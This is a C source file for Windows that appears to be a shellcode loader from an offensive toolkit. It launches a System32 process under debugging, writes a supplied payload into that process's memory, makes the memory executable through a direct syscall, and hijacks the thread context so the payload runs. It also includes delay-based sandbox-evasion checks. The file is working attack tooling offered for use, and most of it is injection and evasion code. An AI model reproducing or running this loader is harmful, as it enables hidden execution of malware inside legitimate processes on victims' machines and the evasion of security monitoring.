#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "Syscalls.h"


#ifdef _M_X64
#define SET_REG(ctx, value) ctx.Rcx = (DWORD64)value
#else
#define SET_REG(ctx, value) ctx.Eax = (DWORD)value
#endif


 //----------------------------------------------------------------------------------------------------------


#define msDelaynumber  10000
int Delay_Exec(int number);

//----------------------------------------------------------------------------------------------------------


void inject_process(HANDLE hProcess, LPCVOID buffer, SIZE_T length, int pid, HANDLE hThread) {
	PVOID ptr = NULL; 
	NTSTATUS Status;
	SIZE_T wrote;
	DWORD  old;

	
	printf("[+] Running VirtualAllocEx ....");
	ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length + 128, MEM_COMMIT, PAGE_READWRITE);
	//if (ptr == NULL) {
	//	printf("failed \n");
	//	return;
	//}
	printf(" [ + ] DONE \n");

	

	Delay_Exec(msDelaynumber);

	printf("[+] Running WriteProcessMemory ....");
	WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T*)&wrote);
	printf(" [ + ] DONE \n");

	


	printf("[+] Running NtProtectVirtualMemory ....");
	NtProtectVirtualMemory(hProcess, &ptr, &length, PAGE_EXECUTE_READWRITE, &old);
	printf(" [ + ] DONE \n");
	
	//printf("[+] Running NtCreateThreadEx ...");
	//HANDLE thread = NULL;
	//Status = NtCreateThreadEx(
	//	&thread,
	//	THREAD_ALL_ACCESS,
	//	NULL,
	//	hProcess,
	//	(LPTHREAD_START_ROUTINE)ptr,
	//	NULL,
	//	NULL,
	//	NULL,
	//	NULL,
	//	NULL,
	//	NULL
	//);
	//printf(" [ + ] DONE \n");

	Delay_Exec(msDelaynumber);

	CONTEXT ctx;
	printf("[+] GetThreadContext ...");
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(hThread, &ctx)) {
		printf("failed \n");
		return;

	}	
	printf(" [ + ] DONE \n");


	printf("[+] SetThreadContext ...");
	SET_REG(ctx, ptr);
	if (!SetThreadContext(hThread, &ctx)) {
		printf("failed \n");
		return;

	}
	printf(" [ + ] DONE \n");
	

	printf("[+] ResumeThread ...");
	ResumeThread(hThread);
	printf(" [ + ] DONE \n");


	Delay_Exec(msDelaynumber);

	DebugActiveProcessStop(pid);
	printf("[+] Debugging is DONE \n");
	
}



int inject(LPCVOID buffer, int length, char* processname) {
	
	
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hProcess = NULL;
	char lbuffer[1024];
	char cmdbuff[1024];

	if (processname == NULL || strlen(processname) == 0) {
		hProcess = GetCurrentProcess();
	}
	else {
		
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		
		GetEnvironmentVariableA("windir", lbuffer, 1024);

		
		_snprintf(cmdbuff, 1024, "%s\\System32\\%s", lbuffer, processname);

		if (!CreateProcessA(
			NULL,
			cmdbuff,
			NULL,
			NULL,
			TRUE,
			IDLE_PRIORITY_CLASS | CREATE_SEPARATE_WOW_VDM | DEBUG_PROCESS| DETACHED_PROCESS,
			NULL,
			NULL, 
			(LPSTARTUPINFOA)&si, 
			&pi)
			) {

			printf("[!] CreateProcessA failed \n");
			return -1;
		}
		hProcess = pi.hProcess;
	}

	Delay_Exec(msDelaynumber);
	
	int pid = pi.dwProcessId; 
	HANDLE hThread = pi.hThread;


	if (GetThreadPriority(hThread) <= 0) {

		printf("[!] Thread is with low Priority\n");

		SetThreadPriority(
			hThread,
			THREAD_PRIORITY_TIME_CRITICAL
		);

		if (GetThreadPriority(hThread) != 15) {
			printf("[-] Failed in making the thread time critical \n");
		}
		else {
			printf("[+] Thread is time critical \n");
		}
	}


	if (!hProcess) {
		printf("[!] process handle failed\n");
		return -1;
	}
	else {
		printf("[+] process handler is set with pid: %d\n", pid);
	}


	Delay_Exec(msDelaynumber);

	inject_process(hProcess, buffer, length, pid, hThread);
}



int Delay_Exec(int number) {
	printf("[+] Running Delay Execution for %d ... \n", number);
	ULONGLONG uptimeBeforeSleep = GetTickCount64();
	typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
	PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
	LARGE_INTEGER delay;
	delay.QuadPart = -10000 * number;
	pNtDelayExecution(FALSE, &delay);
	ULONGLONG uptimeAfterSleep = GetTickCount64();
	if ((uptimeAfterSleep - uptimeBeforeSleep) < number) {
		printf("[!] Delay Execution Failed ! \n");
		return -1;
	}
	else {
		printf("[+] DONE ! \n");
	}
}